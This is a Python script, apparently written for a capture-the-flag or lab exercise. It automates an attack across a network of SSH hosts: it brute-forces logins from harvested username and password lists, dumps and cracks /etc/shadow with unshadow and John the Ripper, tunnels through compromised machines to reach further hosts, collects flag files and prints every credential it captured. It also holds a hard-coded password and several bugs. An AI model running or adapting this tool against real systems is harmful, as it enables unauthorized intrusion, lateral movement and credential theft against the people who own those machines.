#!/usr/bin/env python

import subprocess
import collections
import os.path
import paramiko
import threading
import sys
import socket
import select

try:
    import SocketServer
except ImportError:
    import socketserver as SocketServer
    
SSH_PORT = 22
DEFAULT_PORT = 4000

g_verbose = False
ready_event = None
active = True
forwarding_server = None

class ForwardServer(SocketServer.ThreadingTCPServer):
    daemon_threads = True
    allow_reuse_address = True        


class Handler(SocketServer.BaseRequestHandler):
    def handle(self):  
        global forwarding_server
         
        try:
            chan = self.ssh_transport.open_channel(
                "direct-tcpip",
                (self.chain_host, self.chain_port),
                self.request.getpeername(),
            )
        except Exception as e:
            verbose(
                "Incoming request to %s:%d failed: %s"
                % (self.chain_host, self.chain_port, repr(e))
            )
            return False
        if chan is None:
            verbose(
                "Incoming request to %s:%d was rejected by the SSH server."
                % (self.chain_host, self.chain_port)
            )
            return False

        verbose(
            "Connected!  Tunnel open %r -> %r -> %r"
            % (
                self.request.getpeername(),
                chan.getpeername(),
                (self.chain_host, self.chain_port),
            )
        )
        try:
            while True:
                r, w, x = select.select([self.request, chan], [], [])
                if self.request in r:
                    data = self.request.recv(1024)
                    if len(data) == 0:
                        break
                    chan.send(data)
                if chan in r:
                    data = chan.recv(1024)
                    if len(data) == 0:
                        break
                    self.request.send(data)

            peername = self.request.getpeername()
            chan.close()
            self.request.close()
            
            verbose("Tunnel closed from %r" % (peername,))
            return True
        except Exception as e:
            return True


def forward_tunnel(local_port, remote_host, remote_port, transport):
    # this is a little convoluted, but lets me configure things for the Handler
    # object.  (SocketServer doesn't give Handlers any way to access the outer
    # server normally.)
    class SubHander(Handler):
        chain_host = remote_host
        chain_port = remote_port
        ssh_transport = transport
        
    global forwarding_server
    forwarding_server = ForwardServer(("", local_port), SubHander)
    forwarding_server.serve_forever()
    


def verbose(s):
    if g_verbose:
        print(s)


HELP = """\
Set up a forward tunnel across an SSH server, using paramiko. A local port
(given with -p) is forwarded across an SSH session to an address:port from
the SSH server. This is similar to the openssh -L option.
"""


def forward(options, server, remote, ev):
    global ready_event
    ready_event = ev
    # server = get_host_port(server_addr)
    # remote = get_host_port(remote_addr)
    
    # password = None
    # if options.readpass:
    #     password = getpass.getpass("Enter SSH password: ")

    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.WarningPolicy())

    verbose("Connecting to ssh host %s:%d ..." % (server[0], server[1]))
    try:
        client.connect(
            server[0],
            server[1],
            username=options['user'],
            # key_filename=options.keyfile,s
            # look_for_keys=options.look_for_keys,
            password=options['password'],
        )
    except Exception as e:
        print("*** Failed to connect to %s:%d: %r" % (server[0], server[1], e))
        sys.exit(1)

    verbose(
        "Now forwarding port %d to %s:%d ..."
        % (options['port'], remote[0], remote[1])
    )

    try:
        # print(options['port'], remote[1])
        
        forward_tunnel(
            options['port'], remote[0], remote[1], client.get_transport()
        )
        
    except KeyboardInterrupt:
        print("C-c: Port forwarding stopped.")
        sys.exit(0)


DEBUG = '[!] '
INFO = '[*] '
SPACE = '================================================================================='

class Server:
    def __init__(self, address, port, visited = False, root = False, ssh = [], compromised = False):
        self.address = address
        self.port = port
        self.visited = visited
        self.root = root
        self.ssh = ssh
        self.compromised = compromised

server_q = collections.deque()

# remote_server_address: (host_server_address, host_server_port)
hosts = {}
usernames = []
passwords = set()
visited_servers = []
compromised_servers = []
direct = []

# server_address: (username, password)
credentials = {}

# local_port: server_address
port_map = {}
currPort = 123
first = True
flags = []

def check_root(ssh):
    print(f'{INFO}Checking root')
    
    stdin, output, stderr = ssh.exec_command('cat /etc/shadow')
    if b'permission denied' in stderr.read():
        return False
    else:
        return True 
         
def crack_starting_passwords():
    global passwords
    global usernames
    
    subprocess.Popen('unshadow /etc/passwd /etc/shadow > unshadowed.txt', shell=True, stdout=subprocess.PIPE).stdout.read()
    subprocess.Popen('john --wordlist=./rockyou.txt unshadowed.txt', shell=True, stdout=subprocess.PIPE)
    unshadowed_passwords = subprocess.Popen('john --show unshadowed.txt', shell=True, stdout=subprocess.PIPE).stdout.readlines()
    for password_line in unshadowed_passwords:
        user_pass = password_line.decode("utf-8").split(':')
        if len(user_pass) > 1:
            if user_pass[0] not in usernames:
                usernames.append(user_pass[0])
            passwords.add(user_pass[1])
        

def crack_passwords(ssh):
    if check_root:
        ssh.exec_command('unshadow /etc/passwd /etc/shadow > unshadowed.txt')
        ssh.exec_command('john --wordlist=./rockyou.txt unshadowed.txt')
        stdin, stdout, stderr = ssh.exec_command('john --show unshadowed.txt')
        unshadowed_passwords = stdout.readlines()
        for password_line in unshadowed_passwords:
            # print(password_line)
            user_pass = password_line.split(':')
            if len(user_pass) > 1:
                if user_pass[0] not in usernames:
                    usernames.append(user_pass[0])
                passwords.add(user_pass[1])
    else:
        return False     

def add_servers(ssh, server):  
    print(f'{DEBUG}Adding servers')
    stdin, stdout, stderr = ssh.exec_command('cat servers.txt')
    server_lines = stdout.readlines()
    for line in server_lines:
        remote, port = get_host_port(line, 22)
        new_server = Server(remote, port)
        server_q.append(new_server)
        hosts[remote] = (server.address, server.port)
            
def add_starting_servers(server):
    with open('./servers.txt', 'r') as f:
        for line in f:
            remote, port = get_host_port(line, 22)
            new_server = Server(remote, port)
            server_q.append(new_server)
            hosts[remote] = (server.address, server.port)
            direct.append(new_server.address)
    if os.path.exists('flag.txt'):
        with open('./flag.txt') as f:
            flag = ""
            for line in f:
                flag += line
            flags[server.address] = flag
 
def get_host_port(spec, default_port):
    "parse 'hostname:22' into a host and port, with the port optional"
    args = (spec.split(":", 1) + [default_port])[:2]
    args[1] = int(args[1])
    return (args[0], args[1])

  
def find_flags(ssh, address):
    ssh.exec_command('cd /')
    stdin, stdout, stderr = ssh.exec_command('cat flag.txt')
    # print(stdout.read())
    # print(stderr.read())
    if b'No such file' in stderr.read():
        return
    else:
        flags.append(stdout.read().decode("utf-8"))

def extract_info(server, host_port):
    global first
    global currPort
    global usernames
    global passwords
    global credentials
    print(f'\n{SPACE}')
    print(f'{INFO}Extracting Info')
    
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for username in usernames:
        for password in passwords:
            next_cred = False
            
            try:
                if first:
                    print(f'{INFO}Attempting connection to {server.address}:{server.port} with username: {username}, password: {password}', flush=True)
                    while 1:
                        try:
                            ssh.connect(server.address, port=server.port, username=username, password=password, banner_timeout=5000)
                            break
                        except paramiko.ssh_exception.AuthenticationException as e:
                            next_cred = True
                            break
                        except Exception as ex:
                            continue
                else:
                    print(f'{INFO}Attempting connection to {server.address}:{server.port} (localhost:{currPort}) with username: {username}, password: {password}', flush=True)
                    while 1:
                        try:
                            ssh.connect('127.0.0.1', port=currPort, username=username, password=password, banner_timeout=5000)
                            break
                        except paramiko.ssh_exception.AuthenticationException as e:
                            next_cred = True
                            break
                        except Exception as ex:
                            continue
                    
                if next_cred:
                    continue  
                
                print(f'{INFO}Login successful with {username}, {password}')
                credentials[server.address] = (username, password)
                print(f'{INFO}Connected to {server.address}:{server.port}')
                add_servers(ssh, server)
                visited_servers.append(server.address)
                
                if not first and check_root(ssh):
                    server.root = True
                    crack_passwords(ssh)
                    find_flags(ssh, server.address)
                    # find_ssh_keys()
                    server.visited = True
                    currPort += 1
                    compromised_servers.append(server.address)
                    print(f'{INFO}Compromised {server.address}:{server.port}')
                    
                else:
                    find_flags(ssh, server.address)
                    server.visited = True
                    server.compromised = True
                    compromised_servers.append(server.address)
                    print(f'{INFO}Compromised {server.address}:{server.port}')
                    first = False
                
                ssh.close()
                return
            except Exception as e:
                print(f'{DEBUG}{e}')
                print(f'{DEBUG}Credentials failed.')
                continue
            
    if not server.visited:
        print(f'{INFO} Did not establish root on {server.address}')
        server_q.appendleft(server)  
 
def cleanup():
    print(f'\n{SPACE}')
    print(f'Found {len(flags)} file(s):')
    for flag in flags:
        print(" " * 4 + f'- {flag}')
    print('Found the following credentials:')
    print("IP" + " " * 6 + "Username" + " " * 6 + "Password")
    for machine in credentials:
        print(f'{machine}: {credentials[machine][0]} {credentials[machine][1]}')
       
def main():
    global currPort
    global first
    global usernames
    global passwords
    global credentials
    
    startingServer = Server('127.0.0.1', 22)
    add_starting_servers(startingServer)
    usernames.append('root')
    passwords.add('kali@ACES')
    crack_starting_passwords()
    
    # Main loop
    while server_q:
        server = server_q.pop()
        # print(port_map)
        # print(hosts)
        
        # (address, port)
        host = hosts[server.address]
        host_address = host[0]
        revisit = False
        
        if server.address in visited_servers:
            if server.address in compromised_servers:
                continue
            else:
                revisit = True

        if host_address != '127.0.0.1':
            options = {'user': credentials[host_address][0], 'password': credentials[host_address][1], 'port': currPort}
        
            ready_event = threading.Event()

            if host_address in direct:
                # forward(options, (host_addr, host_port), (remote_addr, remote_port), event)
                forwarding_thread = threading.Thread(target=forward, args=(options, host, (server.address, server.port), ready_event))
            else:
                local_host = ('127.0.0.1', port_map.get(host_address, currPort))
                
                # forward(options, (host_addr, host_port), (remote_addr, remote_port), event)
                forwarding_thread = threading.Thread(target=forward, args=(options, local_host, (server.address, server.port), ready_event))
            
            forwarding_thread.start()
            # ready_event.wait()
            port_map[server.address] = currPort
            
            extract_info(server, port_map.get(host_address, currPort))
        else:
            extract_info(server, 22)
    
        if not server.visited and revist:
            server_q.popleft()
        
    cleanup()                     
    try:
        sys.exit(1)
    except SystemExit:
        print(f'{INFO}No more computers/credentials to try.')
        
    
if __name__ == "__main__":
    main()